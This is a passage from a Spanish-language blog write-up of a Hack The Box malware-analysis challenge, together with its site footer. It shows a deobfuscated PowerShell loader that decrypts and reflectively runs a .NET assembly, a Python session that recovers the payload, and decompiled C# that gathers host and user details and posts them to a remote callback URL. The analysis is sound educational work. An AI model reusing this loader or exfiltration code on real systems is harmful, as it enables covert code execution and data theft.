<span class="mtk1">$payload </span><span class="mtk5">=</span><span class="mtk1"> $Nlgap.TransformFinalBlock($payload</span><span class="mtk5">,</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk5">,</span><span class="mtk1"> $payload.Length);</span>
<span class="mtk1">$Nlgap.Dispose();</span>
<span class="mtk1">$aes.Dispose();</span>
<span class="mtk1">$mNKMr </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">New-Object</span><span class="mtk1"> System.IO.MemoryStream(</span><span class="mtk5">,</span><span class="mtk1"> $payload);</span>
<span class="mtk1">$bTMLk </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">New-Object</span><span class="mtk1"> System.IO.MemoryStream;</span>
<span class="mtk1">$NVPbn </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">New-Object</span><span class="mtk1"> System.IO.Compression.GZipStream($mNKMr</span><span class="mtk5">,</span><span class="mtk1"> [</span><span class="mtk7 mtki">IO.Compression.CompressionMode</span><span class="mtk1">]::Decompress);</span>  
<span class="mtk1">$NVPbn.CopyTo($bTMLk);</span>
<span class="mtk1">$NVPbn.Dispose();</span>
<span class="mtk1">$mNKMr.Dispose();</span>
<span class="mtk1">$bTMLk.Dispose();</span>
<span class="mtk1">$payload </span><span class="mtk5">=</span><span class="mtk1"> $bTMLk.ToArray();</span>
<span class="mtk1">$gDBNO </span><span class="mtk5">=</span><span class="mtk1"> [</span><span class="mtk7 mtki">System.Reflection.Assembly</span><span class="mtk1">]::Load($payload);</span>
<span class="mtk1">$PtfdQ </span><span class="mtk5">=</span><span class="mtk1"> $gDBNO.EntryPoint;</span>
<span class="mtk1">$PtfdQ.Invoke(</span><span class="mtk6">$null</span><span class="mtk5">,</span><span class="mtk1"> (</span><span class="mtk5">,</span><span class="mtk1"> [</span><span class="mtk7 mtki">string</span><span class="mtk1">[]] (</span><span class="mtk4">''</span><span class="mtk1">))) </span>
</code></pre></div><p>B谩sicamente, lo que hace es leer el archivo <code>window.bat</code> y buscar el comentario grande con la cadena codificada en Base64. Luego usa AES para descifrarlo y cargarlo como c贸digo de ensamblador para ejecutarlo. Obs茅rvese que tenemos la clave y el IV para el cifrado AES (como <em>Easter Egg</em>, la clave comienza con <a target="_blank" href="https://0xdf.gitlab.io/"><code>0xdf</code></a>, que es probablemente el creador de este reto).</p><p>Entonces, descifr茅moslo usando Python:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -q
&gt;&gt;&gt; from base64 import b64decode
&gt;&gt;&gt; from Crypto.Cipher import AES
&gt;&gt;&gt;
&gt;&gt;&gt; comment = b64decode(b'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')  
&gt;&gt;&gt; key = b64decode(b'0xdfc6tTBkD+M0zxU7egGVErAsa/NtkVIHXeHDUiW20=')
&gt;&gt;&gt; iv = b64decode(b'2hn/J717js1MwdbbqMn7Lw==')
&gt;&gt;&gt;
&gt;&gt;&gt; aes = AES.new(key, AES.MODE_CBC, iv)
&gt;&gt;&gt;
&gt;&gt;&gt; malware = aes.decrypt(comment)
&gt;&gt;&gt;
&gt;&gt;&gt; with open('malware', 'wb') as f:
...     f.write(malware)
...
3344
&gt;&gt;&gt; exit()

<span class="code-cyan">$</span> <span class="code-dark-green">file</span> <span class="mtku">malware</span>
malware: gzip compressed data, last modified: Sat Jan 28 00:22:25 2023, original size modulo 2^32 134744072
</code></pre></div><h3 id="descompilaci贸n-de-ejecutable-windows">Descompilaci贸n de ejecutable Windows</h3><p>Entonces, ahora tenemos un archivo comprimido con GZIP, lo descomprimos:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">mv</span> <span class="mtku">malware</span> malware.gz

<span class="code-cyan">$</span> <span class="code-dark-green">gzip</span> -d <span class="mtku">malware.gz</span>
gzip: malware.gz: trailing garbage ignored

<span class="code-cyan">$</span> <span class="code-dark-green">file</span> <span class="mtku">malware</span>
malware: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows  

<span class="code-cyan">$</span> <span class="code-dark-green">mv</span> <span class="mtku">malware</span> malware.exe
</code></pre></div><p>N贸tese que <code>gzip</code> muestra una advertencia porque no quitamos el relleno sobrante del descifrado de AES. De todos modos, ahora tenemos un Windows PE compilado de C# .NET.</p><p>En este punto, podemos usar JetBrains dotPeek para descompilarlo y leer el c贸digo fuente en C#:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">// RelicMaps.Program</span>
<span class="mtk5">using</span><span class="mtk1"> </span><span class="mtk8 mtku">System</span><span class="mtk1">;</span>
<span class="mtk5">using</span><span class="mtk1"> </span><span class="mtk8 mtku">System</span><span class="mtk1">.</span><span class="mtk8 mtku">Linq</span><span class="mtk1">;</span>
<span class="mtk5">using</span><span class="mtk1"> </span><span class="mtk8 mtku">System</span><span class="mtk1">.</span><span class="mtk8 mtku">Net</span><span class="mtk1">;</span>
<span class="mtk5">using</span><span class="mtk1"> </span><span class="mtk8 mtku">System</span><span class="mtk1">.</span><span class="mtk8 mtku">Net</span><span class="mtk1">.</span><span class="mtk8 mtku">Http</span><span class="mtk1">;</span>
<span class="mtk5">using</span><span class="mtk1"> </span><span class="mtk8 mtku">System</span><span class="mtk1">.</span><span class="mtk8 mtku">Net</span><span class="mtk1">.</span><span class="mtk8 mtku">Sockets</span><span class="mtk1">;</span>
<span class="mtk5">using</span><span class="mtk1"> </span><span class="mtk8 mtku">System</span><span class="mtk1">.</span><span class="mtk8 mtku">Security</span><span class="mtk1">.</span><span class="mtk8 mtku">Cryptography</span><span class="mtk1">;</span>
<span class="mtk5">using</span><span class="mtk1"> </span><span class="mtk8 mtku">System</span><span class="mtk1">.</span><span class="mtk8 mtku">Text</span><span class="mtk1">;</span>

<span class="mtk5">internal</span><span class="mtk1"> </span><span class="mtk5">class</span><span class="mtk1"> </span><span class="mtk8 mtku">Program</span>
<span class="mtk1">{</span>
<span class="mtk1">  </span><span class="mtk5">private</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk5">void</span><span class="mtk1"> </span><span class="mtk8">Main</span><span class="mtk1">(</span><span class="mtk5">string</span><span class="mtk1">[] args)</span>
<span class="mtk1">  {</span>
<span class="mtk1">    </span><span class="mtk8 mtku">IPAddress</span><span class="mtk1"> iPAddress </span><span class="mtk5">=</span><span class="mtk1"> Dns.</span><span class="mtk8">GetHostAddresses</span><span class="mtk1">(Dns.</span><span class="mtk8">GetHostName</span><span class="mtk1">()).</span><span class="mtk8">FirstOrDefault</span><span class="mtk1">((</span><span class="mtk8 mtku">IPAddress</span><span class="mtk1"> ip) </span><span class="mtk5">=&gt;</span><span class="mtk1"> ip.AddressFamily </span><span class="mtk5">==</span><span class="mtk1"> AddressFamily.InterNetwork);</span>  
<span class="mtk1">    </span><span class="mtk5">string</span><span class="mtk1"> machineName </span><span class="mtk5">=</span><span class="mtk1"> Environment.MachineName;</span>
<span class="mtk1">    </span><span class="mtk5">string</span><span class="mtk1"> userName </span><span class="mtk5">=</span><span class="mtk1"> Environment.UserName;</span>
<span class="mtk1">    </span><span class="mtk8 mtku">DateTime</span><span class="mtk1"> now </span><span class="mtk5">=</span><span class="mtk1"> DateTime.Now;</span>
<span class="mtk1">    </span><span class="mtk5">string</span><span class="mtk1"> text </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"HTB{0neN0Te?_iT'5_4_tr4P!}"</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk5">string</span><span class="mtk1"> s </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">$"i={</span><span class="mtk1">iPAddress</span><span class="mtk4">}&amp;n={</span><span class="mtk1">machineName</span><span class="mtk4">}&amp;u={</span><span class="mtk1">userName</span><span class="mtk4">}&amp;t={</span><span class="mtk1">now</span><span class="mtk4">}&amp;f={</span><span class="mtk1">text</span><span class="mtk4">}"</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk8 mtku">Aes</span><span class="mtk1">? aes </span><span class="mtk5">=</span><span class="mtk1"> Aes.</span><span class="mtk8">Create</span><span class="mtk1">(</span><span class="mtk4">"AES"</span><span class="mtk1">);</span>
<span class="mtk1">    aes</span><span class="mtk5">!</span><span class="mtk1">.Mode </span><span class="mtk5">=</span><span class="mtk1"> CipherMode.CBC;</span>
<span class="mtk1">    aes</span><span class="mtk5">!</span><span class="mtk1">.Key </span><span class="mtk5">=</span><span class="mtk1"> Convert.</span><span class="mtk8">FromBase64String</span><span class="mtk1">(</span><span class="mtk4">"B63PbsPUm3dMyO03Cc2lYNT2oUNbzIHBNc5LM5Epp6I="</span><span class="mtk1">);</span>
<span class="mtk1">    aes</span><span class="mtk5">!</span><span class="mtk1">.IV </span><span class="mtk5">=</span><span class="mtk1"> Convert.</span><span class="mtk8">FromBase64String</span><span class="mtk1">(</span><span class="mtk4">"dgB58uwgaohVelj4Xhs7RQ=="</span><span class="mtk1">);</span>
<span class="mtk1">    aes</span><span class="mtk5">!</span><span class="mtk1">.Padding </span><span class="mtk5">=</span><span class="mtk1"> PaddingMode.PKCS7;</span>
<span class="mtk1">    </span><span class="mtk8 mtku">ICryptoTransform</span><span class="mtk1"> cryptoTransform </span><span class="mtk5">=</span><span class="mtk1"> aes</span><span class="mtk5">!</span><span class="mtk1">.</span><span class="mtk8">CreateEncryptor</span><span class="mtk1">();</span>
<span class="mtk1">    </span><span class="mtk5">byte</span><span class="mtk1">[] bytes </span><span class="mtk5">=</span><span class="mtk1"> Encoding.UTF8.</span><span class="mtk8">GetBytes</span><span class="mtk1">(s);</span>
<span class="mtk1">    </span><span class="mtk5">string</span><span class="mtk1"> text2 </span><span class="mtk5">=</span><span class="mtk1"> Convert.</span><span class="mtk8">ToBase64String</span><span class="mtk1">(cryptoTransform.</span><span class="mtk8">TransformFinalBlock</span><span class="mtk1">(bytes, </span><span class="mtk6">0</span><span class="mtk1">, bytes.Length));</span>
<span class="mtk1">    Console.</span><span class="mtk8">WriteLine</span><span class="mtk1">(text2);</span>
<span class="mtk1">    </span><span class="mtk8 mtku">HttpClient</span><span class="mtk1"> httpClient </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">HttpClient</span><span class="mtk1">();</span>
<span class="mtk1">    </span><span class="mtk8 mtku">HttpRequestMessage</span><span class="mtk1"> httpRequestMessage </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">HttpRequestMessage</span>
<span class="mtk1">    {</span>
<span class="mtk1">      RequestUri </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">Uri</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk4 detected-link">http://relicmaps.htb/callback</span><span class="mtk4">"</span><span class="mtk1">),</span>
<span class="mtk1">      Method </span><span class="mtk5">=</span><span class="mtk1"> HttpMethod.Post,</span>
<span class="mtk1">      Content </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">StringContent</span><span class="mtk1">(text2, Encoding.UTF8, </span><span class="mtk4">"application/json"</span><span class="mtk1">)</span>
<span class="mtk1">    };</span>
<span class="mtk1">    Console.</span><span class="mtk8">WriteLine</span><span class="mtk1">(httpRequestMessage);</span>
<span class="mtk1">    </span><span class="mtk8 mtku">HttpResponseMessage</span><span class="mtk1"> result </span><span class="mtk5">=</span><span class="mtk1"> httpClient.</span><span class="mtk8">SendAsync</span><span class="mtk1">(httpRequestMessage).Result;</span>
<span class="mtk1">    Console.</span><span class="mtk8">WriteLine</span><span class="mtk1">(result.StatusCode);</span>
<span class="mtk1">    Console.</span><span class="mtk8">WriteLine</span><span class="mtk1">(result.Content.</span><span class="mtk8">ReadAsStringAsync</span><span class="mtk1">().Result);</span>
<span class="mtk1">  }</span>
<span class="mtk1">}</span>
</code></pre></div><p>Ahora podemos analizar lo que est谩 haciendo el <em>malware</em>.</p><h2 id="_flag_"><em>Flag</em></h2><p>Pero lo que es m谩s importante, est谩 la <em>flag</em> en texto claro: <code>HTB{0neN0Te?_iT'5_4_tr4P!}</code>.</p><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#an谩lisis-de-_malware_">An谩lisis de <em>malware</em></a><ul><li><a href="#desofuscaci贸n-de-batch">Desofuscaci贸n de Batch</a></li><li><a href="#desofuscaci贸n-de-powershell">Desofuscaci贸n de PowerShell</a></li><li><a href="#descompilaci贸n-de-ejecutable-windows">Descompilaci贸n de ejecutable Windows</a></li></ul></li><li><a href="#_flag_"><em>Flag</em></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer"> <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Recibe un resumen semanal del blog"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">Ver historial de res煤menes</a></p><p class="tc">impulsado por <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; Blog de 7Rocky. Ciberseguridad y Mates 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedInOpens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHubOpens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>